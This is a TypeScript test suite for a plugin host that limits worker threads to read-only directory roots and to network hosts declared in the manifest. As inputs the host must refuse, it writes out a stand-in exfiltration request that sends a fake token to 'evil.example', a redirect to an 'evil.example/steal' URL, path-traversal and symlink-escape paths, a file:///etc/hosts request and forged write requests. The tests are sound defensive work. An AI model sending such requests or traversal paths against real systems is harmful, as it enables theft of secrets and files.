import { afterEach, describe, expect, test } from 'bun:test';
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import type { FetchPort, WorkerHandle, WorkerStartOptions, WorkersPort } from '../../../contract/ports.ts';
import { bunWorkers } from '../../../host/adapters/process.ts';
import { nodeFs } from '../../../host/adapters/node-fs.ts';
import { checkDeadlineMs, runPluginChecks, type PluginCheckDeps } from '../../../host/check-plugins.ts';
import { nodeTempDirs } from '../../../host/adapters/temp-dir.ts';
import { systemClock } from '../../../host/adapters/clock.ts';
import { hostPermitted, restrictFetch, workersFor } from '../../../host/permissions.ts';
import { rootsPortFor } from '../../../host/roots.ts';
import { definePlugin, type DaemonImplementation } from '../../../manifest/index.ts';
import type { PermissionEntry } from '../../../manifest/types.ts';
import { MAX_GRANT_BODY_BYTES } from '../../../host/worker-grants/wire.ts';

/**
 * A worker thread's read-only roots and manifest-host network (R689 workers). Real worker threads: the grants are
 * judged on the main thread, so the proof is what a thread that asks for more actually gets back. Fake values only.
 */
const WORKER = new URL('./fixtures/grants-worker.ts', import.meta.url);
const FAKE_SECRET = 'fake-token-value-0001';

const parents: string[] = [];
const handles: WorkerHandle[] = [];
afterEach(async () => {
  for (const handle of handles.splice(0)) await handle.terminate();
  for (const parent of parents.splice(0)) await rm(parent, { recursive: true, force: true });
});

interface Fixture {
  readonly home: string;
  readonly store: string;
  readonly outside: string;
  readonly fetched: string[];
  readonly started: WorkerStartOptions[];
  readonly workers: WorkersPort;
  start(options: WorkerStartOptions): WorkerHandle;
}

async function fixture(
  options: {
    plugin?: string;
    roots?: Array<'credentials' | 'downloads'>;
    network?: PermissionEntry[];
    answer?: (url: URL) => Response;
  } = {},
): Promise<Fixture> {
  const parent = await mkdtemp(`${tmpdir()}/worker-grants-`);
  parents.push(parent);
  const home = `${parent}/home`;
  const plugin = options.plugin ?? 'logins';
  const store = `${home}/state/${plugin}/credentials`;
  const outside = `${parent}/outside`;
  await mkdir(store, { recursive: true, mode: 0o700 });
  await mkdir(`${home}/state/${plugin}/downloads`, { recursive: true, mode: 0o700 });
  await mkdir(outside, { mode: 0o700 });
  await writeFile(`${store}/account.json`, JSON.stringify({ token: FAKE_SECRET }));
  await writeFile(`${outside}/other.json`, 'outside-fixture');
  const roots = rootsPortFor(
    nodeFs(() => crypto.randomUUID()),
    { home, plugin, worktrees: `${home}-worktrees` },
    options.roots ?? ['credentials'],
    () => undefined,
  );
  const declared = options.network ?? [];
  const fetched: string[] = [];
  const base: FetchPort = {
    request: async url => {
      fetched.push(String(url));
      const parsed = new URL(String(url));
      return (
        options.answer?.(parsed) ??
        (parsed.pathname === '/hop'
          ? new Response(null, { status: 302, headers: { location: 'https://evil.example/steal' } })
          : new Response('fake-body', { status: 200 }))
      );
    },
  };
  const started: WorkerStartOptions[] = [];
  const recording: WorkersPort = {
    start: (url, given) => {
      started.push(given ?? {});
      return bunWorkers().start(url, given);
    },
  };
  const workers = workersFor(recording, () => undefined, {
    plugin,
    roots,
    fetch: restrictFetch(plugin, declared, base),
    declaresNetwork: declared.length > 0,
    mayReach: (hostname, host) =>
      hostPermitted(declared, () => ({ programs: [], hosts: [] }), hostname, undefined, host),
  });
  return {
    home,
    store,
    outside,
    fetched,
    started,
    workers,
    start: given => {
      const handle = workers.start(WORKER, given);
      handles.push(handle);
      return handle;
    },
  };
}

interface Answer {
  ok: boolean;
  probe?: boolean;
  // biome-ignore lint/suspicious/noExplicitAny: a worker answers whatever shape the command asked for
  value?: any;
  type?: string;
  refusal?: string;
  message?: string;
}
function ask(handle: WorkerHandle, command: unknown): Promise<Answer> {
  return new Promise(resolve => {
    const cancel = handle.onMessage(message => {
      cancel();
      resolve(message as Answer);
    });
    handle.post(command);
  });
}

describe('worker grants: the start is judged against THIS plugin manifest', () => {
  test('an undeclared root refuses the start before a thread exists, and so does a root another plugin owns', async () => {
    const f = await fixture({ roots: ['downloads'] });
    expect(() => f.workers.start(WORKER, { roots: ['credentials'] })).toThrow('does not declare it');
    expect(() => f.workers.start(WORKER, { roots: ['work'] })).toThrow('does not declare it');
    expect(() => f.workers.start(WORKER, { roots: ['downloads', 'downloads'] })).toThrow('twice');
    const other = await fixture({ plugin: 'usage', roots: ['credentials'] });
    expect(() => other.workers.start(WORKER, { roots: ['credentials'] })).toThrow('does not declare it');
    expect(f.started).toEqual([]);
    expect(other.started).toEqual([]);
  });

  test('a host the manifest does not declare refuses the start; so does the network when none is declared', async () => {
    const none = await fixture();
    expect(() => none.workers.start(WORKER, { network: true })).toThrow('declares none');
    const f = await fixture({ network: ['api.example.com'] });
    expect(() => f.workers.start(WORKER, { network: ['evil.example'] })).toThrow('does not declare it');
    expect(() => f.workers.start(WORKER, { network: ['api.example.com', 'evil.example'] })).toThrow('does not declare');
    expect(() => f.workers.start(WORKER, { network: ['*'] })).toThrow(TypeError);
    expect(() => f.workers.start(WORKER, { network: [] })).toThrow(TypeError);
    expect(() => f.workers.start(WORKER, { network: false as never })).toThrow(TypeError);
    expect(f.started).toEqual([]);
  });

  test('a plugin with nothing to grant from (no roots or fetch behind it) refuses a grant it was never given', () => {
    const base: WorkersPort = {
      start: () => {
        throw new Error('no thread expected');
      },
    };
    const workers = workersFor(base, () => undefined);
    expect(() => workers.start(WORKER, { roots: ['credentials'] })).toThrow('no roots or network');
    expect(() => workers.start(WORKER, { network: true })).toThrow('no roots or network');
  });

  test('only the named options are forwarded: a plugin cannot smuggle its own workerData or transfer list in', () => {
    const forwarded: unknown[] = [];
    const base: WorkersPort = {
      start: (_, options) => {
        forwarded.push(options);
        return { post() {}, onMessage: () => () => {}, onExit: () => () => {}, terminate: async () => {} };
      },
    };
    workersFor(base, () => undefined).start(WORKER, {
      name: 'n',
      workerData: { planted: 1 },
      transferList: [new ArrayBuffer(1)],
    } as WorkerStartOptions);
    expect(forwarded).toEqual([{ name: 'n' }]);
  });
});

describe('worker grants: roots are READ-ONLY and fenced like a main-thread read', () => {
  test('a granted root reads, lists and stats what is inside it; no path crosses into the thread', async () => {
    const f = await fixture();
    const handle = f.start({ roots: ['credentials'] });
    expect(
      (await ask(handle, { op: 'root', id: 'credentials', method: 'readText', args: ['account.json'] })).value,
    ).toBe(JSON.stringify({ token: FAKE_SECRET }));
    expect((await ask(handle, { op: 'root', id: 'credentials', method: 'list', args: [''] })).value).toEqual([
      'account.json',
    ]);
    const stat = await ask(handle, { op: 'root', id: 'credentials', method: 'stat', args: ['account.json'] });
    expect(stat.value.kind).toBe('file');
    expect(
      (await ask(handle, { op: 'root', id: 'credentials', method: 'stat', args: ['missing.json'] })).value,
    ).toBeUndefined();
    const data = await ask(handle, { op: 'data' });
    expect(data.value.roots).toEqual(['credentials']);
    expect(data.value.grantKeys.sort()).toEqual(['network', 'port', 'roots']);
    expect(data.value.plain).not.toContain(f.home);
    expect(data.value.plain).not.toContain('state/');
  });

  test('the worker side has read operations only: no write, remove, copy, pin, resolve or real path exists on it', async () => {
    const f = await fixture();
    const shape = await ask(f.start({ roots: ['credentials'] }), { op: 'shape', id: 'credentials' });
    expect(shape.value).toEqual(['entries', 'list', 'lstat', 'name', 'readBytes', 'readTail', 'readText', 'stat']);
  });

  test('a forged write, remove, pin, copy or real-path request on the channel is refused and changes nothing', async () => {
    const f = await fixture();
    const handle = f.start({ roots: ['credentials'] });
    for (const [op, args] of [
      ['writeText', ['planted.json', 'x']],
      ['writeBytes', ['planted.json', new Uint8Array([1])]],
      ['remove', ['account.json']],
      ['copyTree', ['', 'a', 'b']],
      ['pin', ['']],
      ['realPath', ['account.json']],
      ['resolve', ['account.json']],
      ['ensurePrivateDirectory', ['sub']],
      ['makeDirectory', ['sub']],
      ['constructor', []],
      ['__proto__', []],
    ] as const) {
      const answer = await ask(handle, {
        op: 'forge',
        message: { kind: 'root', id: 1, root: 'credentials', op, args },
      });
      expect(answer.value).toMatchObject({ id: 1, ok: false, refusal: 'malformed' });
    }
    expect(await readFile(`${f.store}/account.json`, 'utf8')).toBe(JSON.stringify({ token: FAKE_SECRET }));
    expect(await Bun.file(`${f.store}/planted.json`).exists()).toBe(false);
    expect(await Bun.file(`${f.store}/sub`).exists()).toBe(false);
  });

  test('a forged request for a root that was not granted (declared or not) is refused by the main thread', async () => {
    const f = await fixture({ roots: ['credentials', 'downloads'] });
    const handle = f.start({ roots: ['credentials'] });
    for (const root of ['downloads', 'work', 'harness-history', 'nope']) {
      const answer = await ask(handle, {
        op: 'forge',
        message: { kind: 'root', id: 2, root, op: 'readText', args: ['x'] },
      });
      expect(answer.value).toMatchObject({ id: 2, ok: false, refusal: 'not_granted' });
    }
  });

  test('S41 a path with .., an absolute path outside, and a link out of the root are all refused, with no path in the answer', async () => {
    const f = await fixture();
    await symlink(f.outside, `${f.store}/escape`);
    await symlink(`${f.outside}/other.json`, `${f.store}/escape.json`);
    const handle = f.start({ roots: ['credentials'] });
    for (const path of [
      '../../../../outside/other.json',
      `${f.outside}/other.json`,
      'escape/other.json',
      'escape.json',
      'a/../../x',
    ]) {
      const answer = await ask(handle, { op: 'root', id: 'credentials', method: 'readText', args: [path] });
      expect(answer.ok).toBe(false);
      expect(answer.type).toBe('refusal');
      expect(answer.message).not.toContain(f.home);
      expect(answer.message).not.toContain(f.outside);
      expect(answer.message).not.toContain('outside-fixture');
    }
    expect(
      (await ask(handle, { op: 'root', id: 'credentials', method: 'readText', args: ['escape/other.json'] })).refusal,
    ).toBe('link_escape');
  });

  test('a malformed read (a window past the cap, a non-string path) is refused, not served', async () => {
    const f = await fixture();
    const handle = f.start({ roots: ['credentials'] });
    for (const args of [[7], ['account.json', -1], ['account.json', { offset: 0, length: 1e12 }], ['a'.repeat(5000)]]) {
      const answer = await ask(handle, {
        op: 'forge',
        message: { kind: 'root', id: 3, root: 'credentials', op: 'readBytes', args },
      });
      expect(answer.value).toMatchObject({ ok: false, refusal: 'malformed' });
    }
  });
});

describe('worker grants: the network is the manifest hosts, through the kernel.fetch guard', () => {
  const manifest = ['api.example.com', 'other.example.com'];

  test('a granted host answers; a host the manifest does not declare is refused and never reaches the network', async () => {
    const f = await fixture({ network: manifest });
    const handle = f.start({ network: true });
    expect((await ask(handle, { op: 'fetch', url: 'https://api.example.com/ok' })).value).toMatchObject({
      status: 200,
      text: 'fake-body',
    });
    const refused = await ask(handle, { op: 'fetch', url: `https://evil.example/x?token=${FAKE_SECRET}` });
    expect(refused.ok).toBe(false);
    expect(refused.message).toContain('may not reach evil.example');
    expect(refused.message).not.toContain(FAKE_SECRET);
    expect(f.fetched).toEqual(['https://api.example.com/ok']);
  });

  test('a redirect is handed back, never followed; asking for the other host is refused', async () => {
    const f = await fixture({ network: manifest });
    const handle = f.start({ network: true });
    const hop = await ask(handle, { op: 'fetch', url: 'https://api.example.com/hop' });
    expect(hop.value).toMatchObject({ status: 302, location: 'https://evil.example/steal' });
    const followed = await ask(handle, { op: 'fetch', url: hop.value.location });
    expect(followed.ok).toBe(false);
    expect(f.fetched).toEqual(['https://api.example.com/hop']);
  });

  test('a non-http scheme and a malformed address are refused', async () => {
    const f = await fixture({ network: manifest });
    const handle = f.start({ network: true });
    for (const url of ['file:///etc/hosts', 'ftp://api.example.com/x', 'not a url']) {
      expect((await ask(handle, { op: 'fetch', url })).ok).toBe(false);
    }
    expect(f.fetched).toEqual([]);
  });

  test('a host list narrows to a subset: the other manifest host is refused for this worker', async () => {
    const f = await fixture({ network: manifest });
    const handle = f.start({ network: ['api.example.com'] });
    expect((await ask(handle, { op: 'fetch', url: 'https://api.example.com/ok' })).ok).toBe(true);
    const refused = await ask(handle, { op: 'fetch', url: 'https://other.example.com/ok' });
    expect(refused.ok).toBe(false);
    expect(f.fetched).toEqual(['https://api.example.com/ok']);
  });

  test('a response past the cap is refused whole, never truncated', async () => {
    const f = await fixture({
      network: manifest,
      answer: () => new Response(new Uint8Array(MAX_GRANT_BODY_BYTES + 1)),
    });
    const refused = await ask(f.start({ network: true }), { op: 'fetch', url: 'https://api.example.com/big' });
    expect(refused.ok).toBe(false);
    expect(refused.refusal).toBe('too_large');
  });

  test('a failed request answers a fixed word, never the lower layer text', async () => {
    const f = await fixture({
      network: manifest,
      answer: () => {
        throw new Error(`connect refused to https://api.example.com/?token=${FAKE_SECRET}`);
      },
    });
    const answer = await ask(f.start({ network: true }), { op: 'fetch', url: 'https://api.example.com/x' });
    expect(answer).toMatchObject({ ok: false, type: 'refusal', refusal: 'failed' });
    expect(answer.message).not.toContain(FAKE_SECRET);
  });

  test('a forged fetch with no network granted is refused, even for a declared host', async () => {
    const f = await fixture({ network: manifest });
    const handle = f.start({ roots: ['credentials'] });
    const answer = await ask(handle, {
      op: 'forge',
      message: { kind: 'fetch', id: 4, url: 'https://api.example.com/ok' },
    });
    expect(answer.value).toMatchObject({ id: 4, ok: false, refusal: 'not_granted' });
    expect(f.fetched).toEqual([]);
  });
});

describe('worker grants: without a grant the ports throw, naming it', () => {
  test('a worker started with no grants (the check probe) has neither port, and answers its probe all the same', async () => {
    const f = await fixture({ network: ['api.example.com'] });
    const handle = f.start({ name: 'bare', env: {} });
    expect(await ask(handle, { probe: true })).toEqual({ ok: true, probe: true });
    const root = await ask(handle, { op: 'root', id: 'credentials', method: 'readText', args: ['account.json'] });
    expect(root).toMatchObject({ ok: false, type: 'TypeError' });
    expect(root.message).toContain('root credentials: not granted to this worker');
    const net = await ask(handle, { op: 'fetch-port' });
    expect(net.message).toContain('network: not granted to this worker');
    expect((await ask(handle, { op: 'data' })).value.keys).toEqual([]);
  });

  test('a worker granted only roots has no fetch port, only network has no root port, and a second root id is refused', async () => {
    const f = await fixture({ roots: ['credentials', 'downloads'], network: ['api.example.com'] });
    const rootsOnly = f.start({ roots: ['credentials'] });
    expect((await ask(rootsOnly, { op: 'fetch-port' })).message).toContain('network: not granted');
    const other = await ask(rootsOnly, { op: 'root', id: 'downloads', method: 'list', args: [''] });
    expect(other.message).toContain('root downloads: not granted to this worker');
    const networkOnly = f.start({ network: true });
    expect((await ask(networkOnly, { op: 'root', id: 'credentials', method: 'list', args: [''] })).message).toContain(
      'root credentials: not granted',
    );
  });
});

describe('worker grants: the probe starts and stops a worker that uses grants, with none', () => {
  test('R689 fyd --check starts the embedded worker with no state, roots or network, and it answers its probe', async () => {
    const f = await fixture({ network: ['api.example.com'] });
    const manifest = definePlugin({
      id: 'logins',
      title: 'logins',
      version: '5.0.0',
      api: 5,
      core: false,
      kinds: [],
      workers: ['housekeeping'],
    });
    const implementation = {
      half: 'daemon',
      manifest,
      build: () => ({}) as never,
      workers: { housekeeping: WORKER },
    } as unknown as DaemonImplementation;
    const deps: PluginCheckDeps = {
      implementations: [implementation],
      facts: { home: '/h', host: '127.0.0.1', port: 9123, version: '5.0.0', platform: 'linux', arch: 'x64' },
      workers: f.workers,
      tempDirs: nodeTempDirs('/not-the-state-home'),
      clock: systemClock(),
      workerTimeoutMs: 5_000,
    };
    expect(checkDeadlineMs([implementation], { workerTimeoutMs: 5_000 })).toBeGreaterThan(5_000);
    const out: string[] = [];
    await runPluginChecks(deps, line => out.push(line));
    expect(out).toEqual(['workers      housekeeping ready']);
    expect(f.started).toEqual([{ name: 'housekeeping-probe', env: {} }]);
  });
});
